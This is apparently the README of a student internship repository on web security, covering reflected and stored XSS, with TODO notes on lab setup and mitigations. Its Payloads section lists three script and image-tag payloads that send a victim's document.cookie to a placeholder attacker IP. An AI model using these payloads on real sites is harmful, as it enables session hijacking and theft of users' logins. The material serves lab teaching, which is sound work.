# Internship cyber security course
This repository collects tools and methodologies used in the context of system security intership
## Students
1. Dario Collini
2. Andrea Di Caro
## Analyzed vulnerabilities
- XSS reflected
- XSS stored

## Payloads
### Reflected
    <script>window.location.href="http://<attacker IP>:8000/a.html?c="+document.cookie</script>
### Stored
    <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
    <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>

## TODO Filippo
Upload source files

## TODO Andrea & Dario
1. describe the analyzed vulnerabilites (you can use external references)
2. describe the laboratory setup. we need to have Apache2 with PHP enabled. You can install a XAMP server or use a docker container
3. describe the attacks scenario
4. describe the mitigation actions

